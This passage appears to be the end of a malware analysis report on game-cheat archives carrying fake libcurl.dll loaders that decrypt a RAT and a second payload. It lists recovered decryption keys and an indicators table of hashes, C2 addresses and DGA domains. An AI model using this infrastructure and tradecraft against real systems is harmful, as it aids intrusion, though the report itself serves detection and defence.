| ChaCha20 key, c6c9791f | `ef a3 23 7e dc e3 ef d1 e4 67 77 66 f1 0e 08 50 18 3a 46 b1 d6 76 bf c1 46 fa 5d 1a 99 22 1b ad` | VA 0x18005b680 |
| ChaCha20 nonce, c6c9791f | `fd 87 bc 51 ce 01 8c f1 86 62 dc e7` | VA 0x18005b6a0 |
| ChaCha20 key, 576f297b | `44 8b ff 72 71 67 f6 de 4f 28 f8 5b 8a 24 d9 15 21 15 c6 b7 57 ca 41 84 74 b0 ee 5d 9f 1f 39 ee` | VA 0x18005b680 |
| ChaCha20 nonce, 576f297b | `cf 0f b7 95 0b 5b 4d 74 4b e2 ee 36` | VA 0x18005b6a0 |
| ChaCha20 key, 60e51b8b | `54 19 74 82 82 9a 92 cd b7 5b eb a5 be e3 8e 93 6d e5 b6 4f ce e6 c1 f7 6f 00 11 e8 09 13 ed 7a` | VA 0x18005b680 |
| ChaCha20 nonce, 60e51b8b | `69 31 f6 2e 4e bf 4e 05 ad 1a 3f 5f` | VA 0x18005b6a0 |
| SipHash key, d52f40f6 | `75 db 1d 5d 42 69 f1 b5 7c d2 2b ee 52 6a 49 f0` | VA 0x180058668 |
| SipHash nonce, d52f40f6 | LE64 `0x3569aec3fd87447b` | VA 0x180058678 |
| SipHash key, f43c501e | `58 73 68 9c f6 52 63 2b 7b af 3a 3c f8 7d 09 79` | VA 0x1800c8550 |
| SipHash nonce, f43c501e | `0xe16781eabb718ff2` | immediate |
| Layer-1 table, 927af2a9 | `a2 32 22 6d b5 6f 63 ec 09 6c a1 cf 77 b3 c5 ed 2b 41 fe b1 8a c1 d4 cf dd 68 58 11 7a 88 15 f4 da 92 3a 1a 7b 74 54 62 bb e8 7e 57 ae ab f0 26` | VA 0x18009d7f0 |
| XXTEA key, 927af2a9 | `b2 48 d1 59 2a 83 85 ab 25 37 9a fd cd a3 7b e8` | immediates from 0x180001292 |
| Layer-1 table, a222956e | `d9 76 87 b5 a1 7e bd 87 72 07 e8 ad ab 7d 02 e3 d1 56 48 dc 37 5e c4 06 f6 e2 d4 e4 14 9f b7 98 ec 06 ee 90 f7 92 9f 0b d8 ed 9b 8b 06 48 f5 8c` | VA 0x18009d7f0 |
| XXTEA key, a222956e | `68 6e 93 47 34 1c 07 b1 09 89 86 84 12 f2 83 51` | immediates from 0x180001292 |
| AES-256 key, 9a0bb43d | `b1 ea a9 82 c6 22 d9 0d c0 98 81 12 84 dc 8e 33 ca 77 1e 76 fa 1a 93 fe 55 9d 82 60 1d d8 e1 e1` | VA 0x1800c5070 |
| AES IV, 9a0bb43d | `1b e6 f3 a2 84 89 82 97 2e 46 dc d9 e2 46 20 7e` | VA 0x1800c5168 |
| AES-256 key, 026f9106 | `a6 11 31 a3 c2 b8 3c dc 65 88 a2 10 37 3a a3 fb 7c 61 7f 51 6c 3c 50 d2 49 64 3b 46 5e 0a ea b2` | VA 0x1800c7dc0 |
| AES IV, 026f9106 | `ae aa ba dc f5 db c3 e2 d7 34 e0 b4 ea 84 a7 13` | VA 0x1800c7eb8 |
| AES-256 key, 340cedbd | `ee 16 b3 48 85 4e 6c 9f ac fd c4 ff ec e5 0e 10 a6 96 27 8c 86 f7 c9 89 08 a5 80 9c 49 41 a7 0f` | VA 0x1800c65c0 |
| AES IV, 340cedbd | `dd fa 45 88 2f 0f fb 3e 70 96 1d 40 ff be d4 60` | VA 0x1800c66b8 |
| AES-256 key, 45335d65 | `45 0b 14 92 b5 91 7b 7c 2b 67 1f 18 b1 c2 70 73 fc ca 78 de b7 67 7b d9 96 b8 0f 0f 1a 11 4d 19` | VA 0x180110870 |
| AES IV, 45335d65 | `54 85 71 83 d1 2b 46 01 53 c3 2e 8e 3a 43 8e b1` | VA 0x180110968 |
| AES-256 key, 196006c0 | `64 83 91 dd e4 c5 19 15 f4 c1 72 dd 70 3b 00 75 a1 3a 01 a6 c0 5a a6 84 5b 45 da 47 62 86 3c 3d` | VA 0x1800efb18 |
| AES IV, 196006c0 | `91 45 1c 07 45 f7 ce ca 72 fc 76 61 b7 58 6d b8` | VA 0x1800efc18 |
| AES-256 key, 336cd428 | `1e c2 4b 24 9a d1 8a 93 3d 9f ba 53 64 bd 03 27 9c 1c 04 72 fe dd 33 49 2b f3 7e ff ac 3a 4c a4` | VA 0x1800ff870 |
| AES IV, 336cd428 | `b4 87 03 d3 5e 80 0b 8c dd 07 20 c8 b3 53 e4 33` | VA 0x1800ff968 |
| AES-256 key, 2ffa9d2a | `1a e6 d6 71 4a bf da a9 67 a9 ac bf c3 a8 c6 f1 b2 86 10 ee ee 1f bf 00 c2 1c f5 dc f0 b5 cd c6` | VA 0x1800f3318 |
| AES IV, 2ffa9d2a | `9d 7f 0d 0d e2 45 87 d2 d5 d8 05 7a ef 16 8b 76` | VA 0x1800f3418 |
| AES-256 key, 37383dd6 | `f4 6d a3 a3 6f 68 35 fa 3f dc 63 0d 14 3a 38 b8 96 3f e7 4d 46 a1 64 23 a0 1a e2 f6 b3 db 1f ef` | VA 0x180137dc0 |
| AES IV, 37383dd6 | `75 49 49 ee e3 3a 45 9c ba 59 64 c6 f8 5a 2e a7` | VA 0x180137eb8 |
| AES-256 key, 7135da14 | `bc 32 c8 e1 cc 8b 2f b8 a7 81 51 8a a9 bb 9b c9 dd 8b 63 29 59 14 bf b9 3b 77 15 e8 be 7a c7 eb` | VA 0x1802d0070 |
| AES IV, 7135da14 | `66 f3 ff 41 53 8b 7a ba 51 0c 86 73 18 5a 95 2b` | VA 0x1802d0060 |
| AES-256 key, be4d6b8d | `54 69 58 02 5b c6 e0 47 67 2d fc f8 3f 55 90 c0 49 1a 47 c5 94 7d 98 81 cd bf b1 52 1c 8c 90 e1` | VA 0x18026a780 |
| AES IV, be4d6b8d | `3b 85 9a 92 93 85 93 55 db 30 f8 c0 2d 0f c5 d7` | VA 0x18026a770 |
| AES-256 key, e0e99a6b | `8b 93 24 f1 c6 d6 b1 48 f7 eb a0 89 84 9f 33 19 53 6f ef e4 5e c0 c2 a3 0b 91 c6 19 3f 46 95 f0` | VA 0x1802cd1e0 |
| AES IV, e0e99a6b | `29 86 6c bf 89 09 9a 44 f3 59 35 93 a0 ab 17 94` | VA 0x1802cd1d0 |
| AES-256 key, a2627976 | `33 64 ad 6a 53 9b 39 93 5c 80 f0 7e 91 38 44 55 11 d7 a5 4f c5 f9 f4 54 84 95 61 33 39 af d5 84` | VA 0x180331220 |
| AES IV, a2627976 | `76 68 0a 18 40 68 61 8d 22 2c 1e 82 17 49 6b 45` | VA 0x180331210 |
| AES-256 key, a16ac85e | `21 bf 30 30 3f 32 dc 7b 20 fb ec 7f 22 f9 58 48 8b c3 70 9c 1d f4 96 3f 2b b6 6d 6f 3b cb 85 2a` | VA 0x180237b20 |
| AES IV, a16ac85e | `d8 22 fc cb e8 88 86 3d e1 45 77 1c a0 4d 69 06` | VA 0x180237b10 |

## 13. Scope and method

- **Samples:** 22 loader DLL builds from 29 archives and the 23 payloads they decrypt (12 RAT builds, 10 builds of a second payload type, one injector); a different fake `libcurl.dll` from one more archive, whose dropped payload is an 11th second-type build
- **Methods:** static analysis, with every payload decrypted and its config decoded; a loader run, a debugger run of its RAT payload, and runs of a RAT and a second-type payload with the environment gate patched out, against a local C2 simulator; a sandbox run of the dropper
- **Live checks:** infrastructure checks dated 2026-09-19 to 2026-11-06
- **Coverage:** Sections 5 to 8 describe code read statically, except the connection to the configured host, the session setup and hello frame, and the installation steps, which were observed in two gate-patched runs (0b99c3e8 and 8b38b33a) against a local C2 simulator. The loader's child processes (section 2) and the 9c1f879d drop (section 9) were observed in single runs. C2-supplied modules are outside the analysis.

## Indicators

### Malicious

| IOC | Type | Value | Context |
|---|---|---|---|
| Loader DLL | SHA-256 | 495d877c54b7e1a41ed03938f8b208713fcd6ce4c6854c0175ccea32cbb449f8 | 2026-08-11, base64 + XOR; `libcurl.dll` in `XenoExecutor.rar`; also carries the injector SHA-256 of payload 59b05b8763d5f308bdfd9abb14da66d5ee0f0c67ee982eee4ec7eb1632e547f6 |
| Loader DLL | SHA-256 | f35cd5493aeab365297814ed602438b3d06f900518fa4f51ab7ac066e35ef591 | 2026-08-21, ChaCha20-Poly1305; `libcurl.dll` in `ValoHigh.zip` |
| Loader DLL | SHA-256 | c6c9791f9236dbab3e1539396ef1513576a30062095fb045cfdb18fac090ad10 | 2026-08-22, ChaCha20-Poly1305; `libcurl.dll` in `FlexMode.rar` |
| Loader DLL | SHA-256 | 576f297b61a76ec36ee65622ff209d5236d9e9cbdbe302125d0689ccb397bf42 | 2026-08-23, ChaCha20-Poly1305; `libcurl.dll` in `RustiX_V1.6.zip` |
| Loader DLL | SHA-256 | 60e51b8bc32cd98563d0a47c7cc13d4afe85ac19b2f3cb4ae03e8f243a41f11c | 2026-08-24, ChaCha20-Poly1305; `libcurl.dll` in `ValorantHack.zip` |
| Loader DLL | SHA-256 | d52f40f67256905d5f1ba20be94aba2048a50e4527f379783ca3b660da4a70c5 | 2026-08-28, SipHash CTR; `Xeno.dll` in `Xeno-v1.3.60.rar` |
| Loader DLL | SHA-256 | f43c501e1413280d54a12cf8eeaed75e502c5eb58c8822580e0cbb31111eb215 | 2026-08-29, SipHash CTR; `libcurl.dll` in `FortniteHack.zip` |
| Loader DLL | SHA-256 | 927af2a9ad72072828a4fe5fe21d2bd4a59b0a813ef0b2e73c4be41cc074b7bf | 2026-09-04, XXTEA; in `Belium.rar`, `Quantum V4 updated.rar`, `Quantum V4.11.rar` |
| Loader DLL | SHA-256 | a222956ea57d1e61ef8a8bf7c226424d3aeb85b3bee1de2e4dc55204e8a650ba | 2026-09-04, XXTEA; `libcurl.dll` in `AxiomCheat.rar` |
| Loader DLL | SHA-256 | 9a0bb43d2cc222473581b57ae31411d6dc25d654612e07139f52dbb60980b53e | 2026-09-11, AES; `libcurl.dll` in `Nexus.zip` |
| Loader DLL | SHA-256 | 026f91061f2bda281f11e46d38a07ee181ff4c38a41a2858056cfc66933e2ecd | 2026-09-14, AES; `CLibrary.dll` in `Leak.rar`, `Sentlog.dll` in both `Kapu.rar` |
| Loader DLL | SHA-256 | 340cedbd0ba43fbbdc75c9cabc3d1b648c7432fae15934b8fe4a84f2502f1a0c | 2026-09-15, AES; top-level `libcurl.dll` next to `Main.exe` in `mpclient.zip` with SHA-256 of file 8df125c9067c5ef4dd2daae491e362420ef6b25dd8fb0890eb970c2b4a9fc903 |
| Loader DLL | SHA-256 | 45335d65c29dc06019d285c2849977e7c7d271012e97f14b6cce2a85b35f9ded | 2026-09-18, AES; `libcurl.dll` in `Setup_v14.26.01.zip` |
| Loader DLL | SHA-256 | 196006c0d1c5a1218e6e90e4149849f31305b34e6051f949c2e4d4645a5b8fc3 | 2026-09-18, AES; `libcurl.dll` in `Executor.zip` |
| Loader DLL | SHA-256 | 336cd4282808ca3d662dc90e686fa9685b895e30d40e2a30fd227d9d976781ea | 2026-09-18, AES; `libcurl.dll` in `InstallerV_2026_8.13.rar` |
| Loader DLL | SHA-256 | 2ffa9d2ac0f1d4ccd62c5cea4273802b2de428c47fc7d051822670203af4e86d | 2026-09-19, AES; `library\libcurl.dll` next to `Setup.exe` in `mpclient.zip` with SHA-256 of file 9ef19ea806ddb6d641469e600f4ea63361f2d7b9b893403be1971cfb71b9ab5c |
| Loader DLL | SHA-256 | 37383dd6ac753fa60fd478f95535b7baa846d3cdc2d649d5bf73649722c888fd | 2026-09-23, AES; in `Loader.zip` |
| Loader DLL | SHA-256 | 7135da1492bf21e46102e4d41f8bb47b887baca8517a398a46f3b85049f3bfc8 | 2026-09-25, AES; `libcurl.dll` in `KernelV2.zip` |
| Loader DLL | SHA-256 | be4d6b8da25f08d52b9a564b42168d25485bb470af50c39f28ace075ccf3f2ef | 2026-09-27, AES; `libcurl.dll` in `S0fТ.rar` (zero in place of O; the Т is Cyrillic) |
| Loader DLL | SHA-256 | e0e99a6b1859c161d2d2feedba669abb52fa15f681a17f1e389932265c8036d2 | 2026-09-27, AES; `libcurl.dll` in `PalworldExtreme.zip` |
| Loader DLL | SHA-256 | a16ac85e0127ffe9f7f1d0588a83f7d9fa2131e6c772a610b1b7d7325a52a001 | 2026-09-28, AES; `libcurl.dll` in `Anvil_Menu.rar`, `ArcaneRBX.rar`, `Spectra_Menu.rar`, `Ultra_Trainer.rar` |
| Loader DLL | SHA-256 | a26279766d25999250f853a89a6e38edf694f86227e5885b88218d51b2954135 | 2026-09-28, AES; `libcurl.dll` in `DEX_v1.2.rar` |
| RAT | SHA-256 (payload) | 0b99c3e88d50e6d0196fbe21e2367386291a11f53a6d45aa7cfe55ea4aab4ee1 | Built 2026-08-07; decrypted by the loader with SHA-256 of file 495d877c54b7e1a41ed03938f8b208713fcd6ce4c6854c0175ccea32cbb449f8; host 145.63.134.94; written by the loader to `%TEMP%\<12 alphanumerics>.exe` |
| Injector | SHA-256 (payload) | 59b05b8763d5f308bdfd9abb14da66d5ee0f0c67ee982eee4ec7eb1632e547f6 | Built 2026-08-07; second blob of the loader with SHA-256 of file 495d877c54b7e1a41ed03938f8b208713fcd6ce4c6854c0175ccea32cbb449f8 |
| RAT | SHA-256 (payload) | bb8170dbab6ae52ce4d85f95126b25042eb54e738c23e53ea524dea4bbbdd4ec | Built 2026-08-21; decrypted in memory by the loader with SHA-256 of file f35cd5493aeab365297814ed602438b3d06f900518fa4f51ab7ac066e35ef591 and written to `%TEMP%\<12 alphanumerics>.exe` |
| RAT | SHA-256 (payload) | 12b6d8134450885a62e34075f37c8a55b988bb488f76becb0b385bba3ac745f9 | Built 2026-08-22; decrypted in memory by the loader with SHA-256 of file c6c9791f9236dbab3e1539396ef1513576a30062095fb045cfdb18fac090ad10 and written to `%TEMP%\<12 alphanumerics>.exe` |
| RAT | SHA-256 (payload) | 5645fcb8c2931a40f0b84a634e9c89b83c782d8dac4fa25291dd38d98e13514d | Built 2026-08-23; decrypted in memory by the loader with SHA-256 of file 576f297b61a76ec36ee65622ff209d5236d9e9cbdbe302125d0689ccb397bf42 and written to `%TEMP%\<12 alphanumerics>.exe` |
| RAT | SHA-256 (payload) | dfdc92129b387a109a5d5a601ee09342ab5824490466a2723763cfda10a0b439 | Built 2026-08-24; decrypted in memory by the loader with SHA-256 of file 60e51b8bc32cd98563d0a47c7cc13d4afe85ac19b2f3cb4ae03e8f243a41f11c and written to `%TEMP%\<12 alphanumerics>.exe` |
| RAT | SHA-256 (payload) | 25f2cf025a0cbdde3038f926bb469c25e7c656d7fb9ca0ee1f6772b3513f7a2d | Built 2026-08-28; decrypted in memory by the loader with SHA-256 of file d52f40f67256905d5f1ba20be94aba2048a50e4527f379783ca3b660da4a70c5 and written to `%TEMP%\<12 alphanumerics>.exe` |
| RAT | SHA-256 (payload) | 7739288276587cbb6fb4cc15199c2a645e711277696a13fb74d9031c5e553bf0 | Built 2026-08-29; decrypted in memory by the loader with SHA-256 of file f43c501e1413280d54a12cf8eeaed75e502c5eb58c8822580e0cbb31111eb215 and written to `%TEMP%\<12 alphanumerics>.exe` |
| RAT | SHA-256 (payload) | c9a4b84267f0763d1aa550c30395339909e5152cedb24b16448b8d095b7597ce | Built 2026-09-04; decrypted in memory by the loader with SHA-256 of file 927af2a9ad72072828a4fe5fe21d2bd4a59b0a813ef0b2e73c4be41cc074b7bf and written to `%TEMP%\<12 alphanumerics>.exe` |
| RAT | SHA-256 (payload) | 84f02f883a9d38d64e64284bc93059d4d3ed7d4b8f5d991ee859dcaf6a5370a4 | Built 2026-09-04; decrypted in memory by the loader with SHA-256 of file a222956ea57d1e61ef8a8bf7c226424d3aeb85b3bee1de2e4dc55204e8a650ba and written to `%TEMP%\<12 alphanumerics>.exe` |
| RAT | SHA-256 (payload) | a664c2a7255dc69137b16563c3222833f5bb25f37e4404db3c219197eecee343 | Built 2026-09-11; decrypted in memory by the loader with SHA-256 of file 9a0bb43d2cc222473581b57ae31411d6dc25d654612e07139f52dbb60980b53e and written to `%TEMP%\<12 alphanumerics>.exe` |
| RAT | SHA-256 (payload) | 7e4492b56a4ba9212c18fddae5ec28cff12af1bcb1828c15a823bc19ca1816e0 | Built 2026-09-14; decrypted in memory by the loader with SHA-256 of file 026f91061f2bda281f11e46d38a07ee181ff4c38a41a2858056cfc66933e2ecd and written to `%TEMP%\<12 alphanumerics>.exe` |
| RAT | SHA-256 (payload) | a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a | Built 2026-09-15; decrypted in memory by the loader with SHA-256 of file 340cedbd0ba43fbbdc75c9cabc3d1b648c7432fae15934b8fe4a84f2502f1a0c and written to `%TEMP%\<12 alphanumerics>.exe` |
| Second payload type | SHA-256 (payload) | 88c6aa93a438d69907fc45fb86e4f913d658a9e63a6d4f5e7c23cbeba2cf2966 | Built 2026-09-18; decrypted in memory by the loader with SHA-256 of file 45335d65c29dc06019d285c2849977e7c7d271012e97f14b6cce2a85b35f9ded and written to `%TEMP%\<12 alphanumerics>.exe` |
| Second payload type | SHA-256 (payload) | a79ca6cf314c16750936b15b6cf43422f1b66d4f8c4be165deb11f18db6216eb | Built 2026-09-18; decrypted in memory by the loader with SHA-256 of file 196006c0d1c5a1218e6e90e4149849f31305b34e6051f949c2e4d4645a5b8fc3 and written to `%TEMP%\<12 alphanumerics>.exe` |
| Second payload type | SHA-256 (payload) | 3ea2e982c4535d2fee4141daccce99f9e94f74e3744dfc5486d784235da2d514 | Built 2026-09-18; decrypted in memory by the loader with SHA-256 of file 336cd4282808ca3d662dc90e686fa9685b895e30d40e2a30fd227d9d976781ea and written to `%TEMP%\<12 alphanumerics>.exe` |
| Second payload type | SHA-256 (payload) | 97c4b964fe962a395c74201c8a1201eb6fabd8da6528a1005575ad501621ecc5 | Built 2026-09-19; decrypted in memory by the loader with SHA-256 of file 2ffa9d2ac0f1d4ccd62c5cea4273802b2de428c47fc7d051822670203af4e86d and written to `%TEMP%\<12 alphanumerics>.exe` |
| Second payload type | SHA-256 (payload) | c61e689fb3713260d4e75f427cf6e72da57cb166443a5c7faf089724c96a440d | Built 2026-09-23; decrypted in memory by the loader with SHA-256 of file 37383dd6ac753fa60fd478f95535b7baa846d3cdc2d649d5bf73649722c888fd and written to `%TEMP%\<12 alphanumerics>.exe` |
| Second payload type | SHA-256 (payload) | e4f40bf160ad17fd336a645c921652729c561728b9db007cc23e7b0ad636bc43 | Built 2026-09-25; decrypted in memory by the loader with SHA-256 of file 7135da1492bf21e46102e4d41f8bb47b887baca8517a398a46f3b85049f3bfc8 and written to `%TEMP%\<12 alphanumerics>.exe` |
| Second payload type | SHA-256 (payload) | 8451cbfb4e70d0c3f8ebab292c793022cb6a37aa3dc27f0b818218cc413ef18a | Built 2026-09-27; host `mops.to`; decrypted in memory by the loader with SHA-256 of file be4d6b8da25f08d52b9a564b42168d25485bb470af50c39f28ace075ccf3f2ef and written to `%TEMP%\<12 alphanumerics>.exe` |
| Second payload type | SHA-256 (payload) | 8f93b9ab0b4ae1e97456e2bab192bcad3c757eec6476e88e75c222b6a956c3d0 | Built 2026-09-27; host `mops.to`; decrypted in memory by the loader with SHA-256 of file e0e99a6b1859c161d2d2feedba669abb52fa15f681a17f1e389932265c8036d2 and written to `%TEMP%\<12 alphanumerics>.exe` |
| Second payload type | SHA-256 (payload) | 04020b588685193330ab8eea691314af0778c3ad89f1cfe5a75ac4ebb79fcf70 | Built 2026-09-28; host `mops.to`; decrypted in memory by the loader with SHA-256 of file a26279766d25999250f853a89a6e38edf694f86227e5885b88218d51b2954135 and written to `%TEMP%\<12 alphanumerics>.exe` |
| Second payload type | SHA-256 (payload) | 8b38b33a2cdd39ffeeef46bb4ceffd61d8eb758efb747383df6cc447f8b66362 | Built 2026-09-28; host `mops.to`; installs as `RuntimeBrokerA.exe`; decrypted in memory by the loader with SHA-256 of file a16ac85e0127ffe9f7f1d0588a83f7d9fa2131e6c772a610b1b7d7325a52a001 and written to `%TEMP%\<12 alphanumerics>.exe` |
| Dropper DLL | SHA-256 | 0cd47cbbe81b395b917653048e6d7a98b3f6a4aaf803c6631fc456552486777a | Fake `libcurl.dll`, x64, unsigned; in `Setupper.zip`, sideloaded by WinGup renamed `Setupper.exe`; drops and starts the payload with SHA-256 of payload 9c1f879d8edece898eaad331beed42e0d71fb14f4e2d30df2f69fe567745db82 |
| Second payload type | SHA-256 (payload) | 9c1f879d8edece898eaad331beed42e0d71fb14f4e2d30df2f69fe567745db82 | Built 2026-10-11; written to `%TEMP%\<12 alphanumerics>.exe` and started by the fake `libcurl.dll` with SHA-256 of file 0cd47cbbe81b395b917653048e6d7a98b3f6a4aaf803c6631fc456552486777a; host `mops.to` |
| Loader DLL | Imphash | 1e6a4142ad6a521fe1a5012997804f01 | Shared by the eight AES loader builds of 2026-09-11 to 2026-09-23, including `libcurl.dll` with SHA-256 of file 9a0bb43d2cc222473581b57ae31411d6dc25d654612e07139f52dbb60980b53e |
| Loader DLL | Imphash | 286eb6cd2292cc25250d6a004f27fa03 | Shared by the two XXTEA loader builds, including `libcurl.dll` with SHA-256 of file 927af2a9ad72072828a4fe5fe21d2bd4a59b0a813ef0b2e73c4be41cc074b7bf |
| Loader DLL | Imphash | 21948a5ad495329bba26aa76e7d46b4d | `libcurl.dll` with SHA-256 of file 495d877c54b7e1a41ed03938f8b208713fcd6ce4c6854c0175ccea32cbb449f8 |
| Loader DLL | Imphash | 1fb731feb8e4d743ee611ac170d7dfbf | Shared by the four ChaCha20-Poly1305 loader builds, including `libcurl.dll` with SHA-256 of file f35cd5493aeab365297814ed602438b3d06f900518fa4f51ab7ac066e35ef591, and by `Xeno.dll` with SHA-256 of file d52f40f67256905d5f1ba20be94aba2048a50e4527f379783ca3b660da4a70c5 |
| Loader DLL | Imphash | de6c3ada6f32f9866975a6b0a44077f1 | `libcurl.dll` with SHA-256 of file f43c501e1413280d54a12cf8eeaed75e502c5eb58c8822580e0cbb31111eb215 |
| Loader DLL | Imphash | 598915d27b083b04410c2e18a818b2c4 | `libcurl.dll` with SHA-256 of file 7135da1492bf21e46102e4d41f8bb47b887baca8517a398a46f3b85049f3bfc8 |
| Loader DLL | Imphash | 886315a7e836cdf3b24053b447a11369 | `libcurl.dll` with SHA-256 of file be4d6b8da25f08d52b9a564b42168d25485bb470af50c39f28ace075ccf3f2ef |
| Loader DLL | Imphash | edee60124b2995474ffee6d035de7266 | `libcurl.dll` with SHA-256 of file e0e99a6b1859c161d2d2feedba669abb52fa15f681a17f1e389932265c8036d2 |
| Loader DLL | Imphash | c521c039a122b9ef587cacb433de21a6 | `libcurl.dll` with SHA-256 of file a26279766d25999250f853a89a6e38edf694f86227e5885b88218d51b2954135 |
| Loader DLL | Imphash | 2c1a8c694de441a1b30fe38f5167003a | `libcurl.dll` with SHA-256 of file a16ac85e0127ffe9f7f1d0588a83f7d9fa2131e6c772a610b1b7d7325a52a001 |
| Dropper DLL | Imphash | ee0d717045f5d5877e4ff7a9923babca | Fake `libcurl.dll` in `Setupper.zip` with SHA-256 of file 0cd47cbbe81b395b917653048e6d7a98b3f6a4aaf803c6631fc456552486777a |
| RAT | Imphash | 7f972135e4ef2afd8f6b7ede6e0f3f09 | Shared by the 12 RAT payloads, including SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a |
| Injector | Imphash | e0ac1d0d55d7a5cb6e5e7036f38ca323 | Injector with SHA-256 of payload 59b05b8763d5f308bdfd9abb14da66d5ee0f0c67ee982eee4ec7eb1632e547f6 |
| Second payload type | Imphash | 694a10f92efdb5ba9c32ad08fff67a41 | Shared by the 11 second-type payloads, including SHA-256 of payload 88c6aa93a438d69907fc45fb86e4f913d658a9e63a6d4f5e7c23cbeba2cf2966 |
| C2 | IPv4 | 145.63.134.94 | Configured host of the payload with SHA-256 of payload 0b99c3e88d50e6d0196fbe21e2367386291a11f53a6d45aa7cfe55ea4aab4ee1; WebSocket on TCP 406 |
| C2 | IPv4 | 45.91.202.146 | Configured host of the payloads built 2026-08-21 to 2026-09-25, including SHA-256 of payload bb8170dbab6ae52ce4d85f95126b25042eb54e738c23e53ea524dea4bbbdd4ec; WebSocket on TCP 406, module download `GET /task/<type>` on TCP 408 |
| C2 | Domain | mops.to | Configured host of the second-type payloads from 2026-09-27, including SHA-256 of payload 8451cbfb4e70d0c3f8ebab292c793022cb6a37aa3dc27f0b818218cc413ef18a; WebSocket on TCP 406 |
| C2 | IPv4 | 196.251.122.57 | A record of `mops.to`, the host of the payload with SHA-256 of payload 8451cbfb4e70d0c3f8ebab292c793022cb6a37aa3dc27f0b818218cc413ef18a, at Google DoH on 2026-11-05 and 2026-11-06 |
| DGA fallback | Domain | lavlavlavlavlavlav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | lavlavlavlavlavini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | lavlavlavlavinilav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | lavlavlavlaviniini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | lavlavlavinilavlav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | lavlavlavinilavini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | lavlavlaviniinilav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | lavlavlaviniiniini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | lavlavinilavlavlav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | lavlavinilavlavini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | lavlavinilavinilav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | lavlavinilaviniini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | lavlaviniinilavlav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | lavlaviniinilavini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | lavlaviniiniinilav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | lavlaviniiniiniini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | lavinilavlavlavlav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | lavinilavlavlavini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | lavinilavlavinilav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | lavinilavlaviniini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | lavinilavinilavlav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | lavinilavinilavini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
